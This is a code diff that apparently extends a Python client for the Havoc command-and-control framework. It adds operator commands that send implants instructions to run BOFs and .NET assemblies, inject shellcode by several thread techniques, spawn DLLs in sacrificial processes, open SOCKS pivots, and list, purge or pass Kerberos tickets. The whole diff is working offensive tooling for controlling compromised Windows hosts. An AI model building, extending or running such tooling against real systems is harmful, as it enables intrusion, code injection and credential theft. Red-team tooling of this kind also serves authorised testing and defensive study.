@@ -166,6 +166,45 @@ COMMANDS: dict[str, dict[str, Any]] = {
                    "verified": True},
     "exit":       {"cmd": CMD_EXIT,
                    "help": "Exit: thread (kill beacon) | process (kill process)"},
+    "inline-execute": {"cmd": CMD_INLINE_EXECUTE,
+                       "help": "Run a BOF: inline-execute <path-in-portal> "
+                               "[function] [args] — file is read portal-side "
+                               "and sent base64 (CommandSend.cc InlineExecute)",
+                       "verified": True},
+    "dotnet":     {"cmd": CMD_INLINE_EXECUTE_ASSEMBLY,
+                   "help": "Run a .NET assembly: dotnet <path-in-portal> "
+                           "[args] (AssemblyInlineExecute)",
+                   "verified": True},
+    "shellcode-execute": {"cmd": CMD_INJECT_SHELLCODE,
+                          "help": "Execute shellcode in-process: "
+                                  "shellcode-execute <path-in-portal> "
+                                  "[createremotethread|ntcreatethreadex|"
+                                  "ntqueueapcthread] (Way=Execute)",
+                          "verified": True},
+    "dll-spawn":  {"cmd": CMD_INJECT_DLL_SPAWN,
+                   "help": "Run a DLL in a sacrificial process: "
+                           "dll-spawn <path-in-portal> [args] "
+                           "(CommandSend.cc DllSpawn)",
+                   "verified": True},
+    "transfer":   {"cmd": CMD_TRANSFER,
+                   "help": "Transfer list/info: transfer list | info <file-id>",
+                   "verified": True},
+    "socks":      {"cmd": CMD_SOCKET,
+                   "help": "Socks: socks list | start <args> | stop <id> "
+                           "(CommandExecute::Socket)",
+                   "verified": True},
+    "luid":       {"cmd": CMD_KERBEROS,
+                   "help": "List logon session IDs (KERBEROS luid)",
+                   "verified": True},
+    "klist":      {"cmd": CMD_KERBEROS,
+                   "help": "Kerberos tickets: klist [luid1] [luid2]",
+                   "verified": True},
+    "purge":      {"cmd": CMD_KERBEROS,
+                   "help": "Purge Kerberos tickets: purge [luid]",
+                   "verified": True},
+    "ptt":        {"cmd": CMD_KERBEROS,
+                   "help": "Pass-the-ticket: ptt <ticket-b64> [luid] "
+                           "(CommandExecute::Ptt)"},
 }
 
 # Format -> FileType (dispatch.go:883-901)
@@ -587,6 +626,98 @@ class HavocClient:
             if rest not in ("thread", "process"):
                 raise BackendError("havoc: exit takes thread|process")
             extra = {"ExitMethod": rest}
+        elif cmd_id == CMD_INLINE_EXECUTE:
+            # InlineExecute(Path, FunctionName, Args, Flags): the GUI reads
+            # the BOF operator-side and ships it base64; Arguments are ALSO
+            # base64'd on the wire (CommandSend.cc:107-109).
+            bits = rest.split(None, 2)
+            if not bits:
+                raise BackendError(
+                    "havoc: inline-execute needs <path-in-portal> "
+                    "[function] [args]")
+            path = bits[0]
+            try:
+                content = open(path, "rb").read()
+            except OSError as exc:
+                raise BackendError(f"havoc: cannot read BOF {path}: {exc}")
+            extra = {"FunctionName": bits[1] if len(bits) > 1 else "go",
+                     "Binary": base64.b64encode(content).decode(),
+                     "Arguments": self._b64(bits[2] if len(bits) > 2 else ""),
+                     "Flags": ""}
+        elif cmd_id == CMD_INLINE_EXECUTE_ASSEMBLY:
+            # AssemblyInlineExecute(Path, Args): Binary base64, Arguments
+            # plain (CommandSend.cc:154-155).
+            bits = rest.split(None, 1)
+            if not bits:
+                raise BackendError("havoc: dotnet needs <path-in-portal> [args]")
+            try:
+                content = open(bits[0], "rb").read()
+            except OSError as exc:
+                raise BackendError(
+                    f"havoc: cannot read assembly {bits[0]}: {exc}")
+            extra = {"Binary": base64.b64encode(content).decode(),
+                     "Arguments": bits[1] if len(bits) > 1 else ""}
+        elif cmd_id == CMD_INJECT_SHELLCODE:
+            # ShellcodeExecute(Technique, Arch, Path, Arguments): Way selects
+            # the injection mode; Technique is the GUI's dropdown index
+            # (1..5) the daemon Atoi's (CommandSend.cc:226-248).
+            bits = rest.split()
+            if not bits:
+                raise BackendError(
+                    "havoc: shellcode-execute needs <path-in-portal> "
+                    "[technique]")
+            try:
+                content = open(bits[0], "rb").read()
+            except OSError as exc:
+                raise BackendError(
+                    f"havoc: cannot read shellcode {bits[0]}: {exc}")
+            extra = {"Way": "Execute",
+                     "Technique": bits[1] if len(bits) > 1
+                     else "createremotethread",
+                     "Binary": base64.b64encode(content).decode(),
+                     "Arguments": "",
+                     "Arch": "x64"}
+        elif cmd_id == CMD_INJECT_DLL_SPAWN:
+            # DllSpawn(Path, Args): Binary base64, Arguments base64.
+            bits = rest.split(None, 1)
+            if not bits:
+                raise BackendError("havoc: dll-spawn needs <path-in-portal>")
+            try:
+                content = open(bits[0], "rb").read()
+            except OSError as exc:
+                raise BackendError(f"havoc: cannot read DLL {bits[0]}: {exc}")
+            extra = {"Binary": base64.b64encode(content).decode(),
+                     "Arguments": self._b64(bits[1] if len(bits) > 1 else "")}
+        elif cmd_id == CMD_TRANSFER:
+            # Transfer(SubCommand, FileID) (CommandSend.cc:464-481).
+            bits = rest.split(None, 1)
+            extra = {"Command": bits[0] if bits else "list",
+                     "FileID": bits[1] if len(bits) > 1 else ""}
+        elif cmd_id == CMD_SOCKET:
+            # Socket(SubCommand, Params) — socks/pivot/rportfwd share it.
+            bits = rest.split(None, 1)
+            if not bits:
+                raise BackendError("havoc: socks needs list|start|stop ...")
+            extra = {"Command": bits[0],
+                     "Params": bits[1] if len(bits) > 1 else ""}
+        elif cmd_id == CMD_KERBEROS:
+            # KERBEROS frames: luid (no args), klist (Argument1/2),
+            # purge (Argument), ptt (Ticket, Luid) (CommandSend.cc:502-580).
+            if name == "luid":
+                extra = {"Command": "luid"}
+            elif name == "klist":
+                bits = rest.split()
+                extra = {"Command": "klist",
+                         "Argument1": bits[0] if bits else "",
+                         "Argument2": bits[1] if len(bits) > 1 else ""}
+            elif name == "purge":
+                extra = {"Command": "purge", "Argument": rest}
+            elif name == "ptt":
+                bits = rest.split(None, 1)
+                if not bits:
+                    raise BackendError("havoc: ptt needs <ticket-b64> [luid]")
+                extra = {"Command": "ptt", "Ticket": bits[0],
+                         "Luid": bits[1] if len(bits) > 1 else ""}
         # CHECKIN / SCREENSHOT carry no extra keys. PROC_LIST requires
         # FromProcessManager ("true"/"false" strings): omitting it crashes
         # the teamserver (Go panic on the missing key -> container restart).
